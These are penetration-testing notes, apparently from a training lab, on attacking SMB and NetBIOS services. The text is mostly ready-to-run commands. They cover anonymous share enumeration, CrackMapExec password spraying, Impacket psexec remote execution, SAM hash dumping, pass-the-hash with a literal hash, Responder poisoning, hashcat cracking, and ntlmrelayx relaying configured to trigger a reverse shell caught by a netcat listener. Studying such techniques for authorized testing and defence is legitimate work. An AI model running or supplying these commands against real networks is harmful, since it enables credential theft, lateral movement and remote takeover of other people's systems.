
TCP/139 and UDP/137 and 138 (NetBIOS over TCP/IP)
TCP/445

Tools to connect:
- smbclient
- smbmap
- rpcclient
- enum4linux

Tools to exploit:
- Impacket PsExec
- Impacket SMBExec
- Impacket atexec
- CrackMapExec
- Metasploit PsExec

Samba = SMB for Linux

```shell-session
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

##### Anonymous Authentication
```shell-session
smbclient -N -L //10.129.14.128
```
```shell-session
smbmap -H 10.129.14.128
```
```shell-session
smbmap -H 10.129.14.128 -r notes
```
```shell-session
smbmap -H 10.129.14.128 --download "notes\note.txt"
```
```shell-session
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
```shell-session
rpcclient -U'%' 10.10.110.17
```
```shell-session
./enum4linux-ng.py 10.10.11.45 -A -C
```


### Protocol Specific Attacks

If no anonymous access, we must
- brute force
- password spray

```shell-session
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
(--continue-on-success flag can be set)
(--local-auth is used for computer that is not domain joined)

If admin or high privileges:
- Remote code execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash


#### Impacket PsExec
```shell-session
impacket-psexec -h
```
```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```
(same applicket to impacket-smbexec and impacket-atexec)

#### CrackMapExec
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

Enumerating logged-on users
```shell-session
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Extracting Hashes from SAM Database
```shell-session
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

Pass-the-Hash
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```


#### Forced Authentication Attacks

Tool:
- Responder (/usr/share/responder/logs/ is where hashes are stored)

```shell-session
responder -I <interface name>
```
```shell-session
sudo responder -I ens33
```

Once credentials are captured, we can use hashcat module 5600 or relay to a remote host to complete the authentication and impersonate the user.

```shell-session
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

If hashcat does not crack it:

```shell-session
cat /etc/responder/Responder.conf | grep 'SMB ='
```
Set SMB to OFF
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

Reverse shells: https://www.revshells.com/
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'reverse shell goes here'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell
```shell-session
nc -lvnp 9001
```


